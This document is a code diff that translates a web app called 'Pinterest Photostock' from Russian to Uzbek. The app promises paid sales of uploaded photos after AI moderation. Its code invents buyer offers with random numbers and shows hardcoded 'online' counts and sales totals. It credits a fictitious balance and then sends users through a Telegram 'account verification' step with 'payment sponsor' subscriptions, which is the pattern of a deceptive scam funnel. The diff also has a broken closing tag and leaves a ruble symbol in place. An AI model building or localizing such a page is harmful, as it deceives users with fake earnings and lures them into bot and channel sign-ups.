@@ -894,35 +894,35 @@ input[type="file"] { display: none; }
     <section class="page active" id="home">
       <div class="glass-card hero">
         <div class="badge">✨ Premium AI Platform</div>
-        <h1>Добро пожаловать</h1>
-        <p>Pinterest Photostock — платформа, где ваши фотографии могут получить оценку и найти своего покупателя.</p>
-        <p>Загружайте снимки: lifestyle, предметные фото, эстетичные кадры или повседневный контент — система проанализирует их и подберёт предложения.</p>
+        <h1>Xush kelibsiz</h1>
+        <p>Pinterest Photostock — bu suratlaringiz baholanishi va o‘z xaridorini topishi mumkin bo‘lgan platforma.</p>
+        <p>Lifestyle, predmet suratlari, estetik kadrlar yoki kundalik kontentni yuklang — tizim ularni tahlil qilib, mos takliflarni topadi.</p>
 
         <div class="btn-stack">
-          <button class="btn light" type="button">Купить фото только для авторов</button>
-          <button class="btn" type="button" onclick="showPage('upload')">Загрузить фото</button>
+          <button class="btn light" type="button">Surat sotib olish (faqat mualliflar uchun)</button>
+          <button class="btn" type="button" onclick="showPage('upload')">Surat yuklash</button>
         </div>
       </div>
 
       <div class="stats">
-        <div class="stat"><small>Авторов online</small><b>15 385</b></div>
-        <div class="stat"><small>Клиентов online</small><b>19 230</b></div>
-        <div class="stat"><small>Продано всего</small><b>1 989 080</b></div>
-        <div class="stat"><small>Сегодня продано</small><b>17 210</b></div>
+        <div class="stat"><small>Onlayn mualliflar</small><b>15 385</b></div>
+        <div class="stat"><small>Onlayn mijozlar</small><b>19 230</b></div>
+        <div class="stat"><small>Jami sotilgan</small><b>1 989 080</b></div>
+        <div class="stat"><small>Bugun sotilgan</small><b>17 210</b></div>
       </div>
     </section>
 
     <section class="page" id="upload">
       <div class="glass-card upload-card">
-        <div class="badge">📸 Загрузка</div>
-        <h2>Загрузите фото</h2>
-        <p>Выберите до 10 снимков из галереи</p>
-        <p class="count" id="countText">Выбрано: 0 / 10</p>
+        <div class="badge">📸 Yuklash</div>
+        <h2>Suratlarni yuklang</h2>
+        <p>Galereyadan 10 tagacha surat tanlang</p>
+        <p class="count" id="countText">Tanlandi: 0 / 10</p>
 
         <input id="fileInput" type="file" accept="image/*" multiple="">
         <div class="upload-grid" id="photoGrid"><label class="add-photo" for="fileInput">+</label></div>
 
-        <button class="btn" id="sendBtn" type="button" disabled="" onclick="startModeration()">Отправить на проверку</button>
+        <button class="btn" id="sendBtn" type="button" disabled="" onclick="startModeration()">Tekshiruvga yuborish</button>
       </div>
     </section>
 
@@ -930,8 +930,8 @@ input[type="file"] { display: none; }
       <div class="center-card">
         <div class="glass-card status-card">
           <div class="loader"></div>
-          <h2>Модерация...</h2>
-          <p>Искусственный интеллект проверяет качество и уникальность ваших фото.</p>
+          <h2>Moderatsiya...</h2>
+          <p>Sun'iy intellekt suratlaringizning sifati va noyobligini tekshirmoqda.</p>
         </div>
       </div>
     </section>
@@ -940,10 +940,10 @@ input[type="file"] { display: none; }
       <div class="center-card">
         <div class="glass-card status-card">
           <div class="success-icon">✓</div>
-          <h2>Проверка пройдена</h2>
-          <p>Ваши фотографии соответствуют стандартам качества платформы.</p>
+          <h2>Tekshiruvdan o'tdi</h2>
+          <p>Suratlaringiz platforma sifat standartlariga mos keladi.</p>
           <div class="btn-stack">
-            <button class="btn" type="button" onclick="findBuyer()">Поиск покупателя</button>
+            <button class="btn" type="button" onclick="findBuyer()">Xaridor qidirish</button>
           </div>
         </div>
       </div>
@@ -953,8 +953,8 @@ input[type="file"] { display: none; }
       <div class="center-card">
         <div class="glass-card status-card">
           <div class="search-icon">⌕</div>
-          <h2>Поиск покупателя...</h2>
-          <p>Найдено несколько потенциальных покупателей.</p>
+          <h2>Xaridor qidirilmoqda...</h2>
+          <p>Bir nechta potensial xaridor topildi.</p>
           <div class="dots"><span></span><span></span><span></span></div>
         </div>
       </div>
@@ -962,13 +962,13 @@ input[type="file"] { display: none; }
 
     <section class="page" id="offer">
       <div class="glass-card offer-card">
-        <div class="badge">✓ Предложение найдено</div>
-        <p>Покупатель готов забрать ваши фото за:</p>
-        <div class="offer-price" id="offerPrice">0 ₽</div>
+        <div class="badge">✓ Taklif topildi</div>
+        <p>Xaridor suratlaringizni quyidagi narxda sotib olishga tayyor:</p>
+        <div class="offer-price" id="offerPrice">0 so'm</div>
 
         <div class="btn-stack">
-          <button class="btn secondary" type="button" onclick="findBuyer()">Найти нового покупателя</button>
-          <button class="btn green" type="button" onclick="acceptDeal()">Принять сделку</button>
+          <button class="btn secondary" type="button" onclick="findBuyer()">Yangi xaridor topish</button>
+          <button class="btn green" type="button" onclick="acceptDeal()">Bitimni qabul qilish</button>
         </div>
       </div>
     </section>
@@ -976,14 +976,14 @@ input[type="file"] { display: none; }
     <section class="page" id="balance">
       <div class="glass-card profile-card">
         <div class="avatar" id="avatar">👤</div>
-        <h2 id="username">Автор</h2>
-        <div class="verified">Аккаунт верифицирован</div>
-        <div class="balance-label">Общий баланс</div>
-        <div class="balance-big" id="bigBalance">0 ₽</div>
+        <h2 id="username">Muallif</h2>
+        <div class="verified">Hisob tasdiqlangan</div>
+        <div class="balance-label">Umumiy balans</div>
+        <div class="balance-big" id="bigBalance">0 so'm</div>
 
         <div class="btn-stack">
-          <button class="btn" type="button" onclick="showPage('withdraw-methods')">Вывести деньги</button>
-          <button class="btn light" type="button" onclick="sellMore()">Продать ещё фото</button>
+          <button class="btn" type="button" onclick="showPage('withdraw-methods')">Pulni yechib olish</button>
+          <button class="btn light" type="button" onclick="sellMore()">Yana surat sotish</button>
         </div>
       </div>
     </section>
@@ -991,28 +991,28 @@ input[type="file"] { display: none; }
 
     <section class="page" id="withdraw-methods">
       <div class="glass-card methods-card">
-        <div class="badge">💳 Способ вывода</div>
-        <h2>Куда вывести средства?</h2>
-        <p>Выберите удобный способ получения выплаты.</p>
+        <div class="badge">💳 Pul yechish usuli</div>
+        <h2>Mablag'ni qayerga yechmoqchisiz?</h2>
+        <p>To'lovni olishning qulay usulini tanlang.</p>
 
         <div class="methods-list">
           <button class="withdraw-method" type="button" onclick="selectWithdrawMethod('Банковская карта')">
             <div class="method-left">
               <div class="method-icon">💳</div>
               <div>
-                <span class="method-title">Банковская карта</span>
-                <span class="method-desc">На банковскую карту</span>
+                <span class="method-title">Bank kartasi</span>
+                <span class="method-desc">Bank kartasiga</span>
               </div>
             </div>
             <div class="method-arrow">›</div>
           </button>
 
-          <button class="withdraw-method" type="button" onclick="selectWithdrawMethod('Криптовалюта')">
+          <button class="withdraw-method" type="button" onclick="selectWithdrawMethod('Kriptovalyuta')">
             <div class="method-left">
               <div class="method-icon">₿</div>
               <div>
-                <span class="method-title">Криптовалюта</span>
-                <span class="method-desc">USDT / криптокошелёк</span>
+                <span class="method-title">Kriptovalyuta</span>
+                <span class="method-desc">USDT / kripto hamyon</span>
               </div>
             </div>
             <div class="method-arrow">›</div>
@@ -1023,7 +1023,7 @@ input[type="file"] { display: none; }
               <div class="method-icon">⭐</div>
               <div>
                 <span class="method-title">Telegram Stars</span>
-                <span class="method-desc">Получение внутри Telegram</span>
+                <span class="method-desc">Telegram ichida olish</span>
               </div>
             </div>
             <div class="method-arrow">›</div>
@@ -1034,20 +1034,20 @@ input[type="file"] { display: none; }
 
     <section class="page" id="withdraw">
       <div class="glass-card withdraw-card">
-        <div class="badge">✨ Последний шаг</div>
-        <h2>Подтверждение аккаунта</h2>
-        <p>Аккаунт почти готов. Чтобы завершить активацию и перейти к выводу средств, подтвердите аккаунт через Telegram.</p>
+        <div class="badge">✨ Oxirgi qadam</div>
+        <h2>Hisobni tasdiqlash</h2>
+        <p>Hisob deyarli tayyor. Faollashtirishni yakunlash va mablag'ni yechib olish uchun Telegram orqali hisobni tasdiqlang.</p>
 
         <div class="selected-method-box">
-          <span class="selected-method-label">Выбранный способ вывода</span>
-          <span class="selected-method-value" id="selectedWithdrawMethod">Будет выбран на предыдущем шаге</span>
+          <span class="selected-method-label">Tanlangan pul yechish usuli</span>
+          <span class="selected-method-value" id="selectedWithdrawMethod">Oldingi bosqichda tanlanadi</span>
         </div>
 
         <div class="important-box">
           <div class="important-icon">🔐</div>
           <div>
-            <div class="important-title">Остался последний шаг</div>
-            <div class="important-text">После нажатия приложение подготовит переход и откроет чат с ботом для подтверждения аккаунта.</div>
+            <div class="important-title">Oxirgi qadam qoldi</div>
+            <div class="important-text">Tugmani bosganingizdan so'ng ilova tayyorlanadi va hisobni tasdiqlash uchun bot bilan chat ochiladi.</div>
           </div>
         </div>
 
@@ -1055,23 +1055,23 @@ input[type="file"] { display: none; }
           <div class="premium-item">
             <div class="premium-icon">✅</div>
             <div>
-              <b>Фото прошли проверку</b>
-              <span>Качество снимков подтверждено системой</span>
+              <b>Suratlar tekshiruvdan o'tdi</b>
+              <span>Suratlar sifati tizim tomonidan tasdiqlandi</span>
             </div>
           </div>
 
           <div class="premium-item">
             <div class="premium-icon">💳</div>
             <div>
-              <b>Способ вывода выбран</b>
-              <span>Осталось подтвердить аккаунт в Telegram</span>
+              <b>Pul yechish usuli tanlandi</b>
+              <span>Endi faqat Telegram orqali hisobni tasdiqlash qoldi</span>
             </div>
           </div>
         </div>
       </div>
 
       <div class="btn-stack">
-        <button class="btn" type="button" onclick="checkSubs()">Подтвердить аккаунт</button>
+        <button class="btn" type="button" onclick="checkSubs()">Hisobni tasdiqlash</button>
       </div>
     </section>
   </div>
@@ -1082,12 +1082,12 @@ input[type="file"] { display: none; }
 <div class="check-overlay" id="checkOverlay">
   <div class="check-modal">
     <div class="check-loader"></div>
-    <div class="check-title">Подключаем Telegram</div>
-    <div class="check-text">Подготавливаем безопасный переход в бот для подтверждения аккаунта.</div>
+    <div class="check-title">Telegram ulanmoqda</div>
+    <div class="check-text">Hisobni tasdiqlash uchun botga xavfsiz o'tish tayyorlanmoqda.</div>
     <div class="check-progress">
-      <div class="check-row"><span class="check-dot"></span><span>Проверка данных аккаунта</span></div>
-      <div class="check-row"><span class="check-dot"></span><span>Подготовка подтверждения</span></div>
-      <div class="check-row"><span class="check-dot"></span><span>Открытие Telegram-бота</span></div>
+      <div class="check-row"><span class="check-dot"></span><span>Hisob ma'lumotlari tekshirilmoqda</span></div>
+      <div class="check-row"><span class="check-dot"></span><span>Tasdiqlash tayyorlanmoqda/span></div>
+      <div class="check-row"><span class="check-dot"></span><span>Telegram boti ochilmoqda</span></div>
     </div>
   </div>
 </div>
@@ -1271,8 +1271,8 @@ function findBuyer() {
 
 function generateOffer() {
   const count = photos.length;
-  const min = count <= 3 ? 200 : 1000;
-  const max = count <= 3 ? 1000 : 3350;
+  const min = count <= 3 ? 30664 : 153321;
+  const max = count <= 3 ? 153321 : 513625;
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
@@ -1290,7 +1290,7 @@ function acceptDeal() {
     }
   }
 
-  showToast(`На баланс зачислено ${currentOffer.toLocaleString("ru-RU")} ₽`);
+  showToast(`Balansga hisoblandi ${currentOffer.toLocaleString("ru-RU")} ₽`);
   saveState("balance");
   showPage("balance");
 }
@@ -1300,7 +1300,7 @@ function selectWithdrawMethod(method) {
   selectedWithdrawMethod = method;
   const box = document.getElementById("selectedWithdrawMethod");
   if (box) box.textContent = method;
-  showToast("Выбран способ вывода: " + method);
+  showToast("Pul yechish usuli tanlandi: " + method);
   saveState("withdraw");
   showPage("withdraw");
 }
@@ -1341,10 +1341,10 @@ function renderSubs() {
         <div class="sub-icon">${firstLetter}</div>
         <div>
           <div class="sub-name">${item[0]}</div>
-          <div class="sub-desc">Спонсор выплат</div>
+          <div class="sub-desc">To'lov homiysi</div>
         </div>
       </div>
-      <div class="sub-action">Подписаться</div>
+      <div class="sub-action">Obuna bo'lish</div>
     `;
     a.addEventListener("click", e => {
       e.preventDefault();
@@ -1386,7 +1386,7 @@ function checkSubs() {
       }, 700);
     } else {
       if (overlay) overlay.classList.remove("active");
-      showToast("Не удалось открыть Telegram-бот. Попробуйте ещё раз.");
+      showToast("Telegram botini ochib bo'lmadi. Iltimos, yana bir bor urinib ko'ring.");
     }
   }, 1800);
 }
@@ -1412,7 +1412,7 @@ updateBalance();
 
 if (restored && restoredPage && document.getElementById(restoredPage)) {
   showPage(restoredPage, false);
-  showToast("Прогресс восстановлен");
+  showToast("Jarayon tiklandi");
 } else {
   saveState("home");
 }
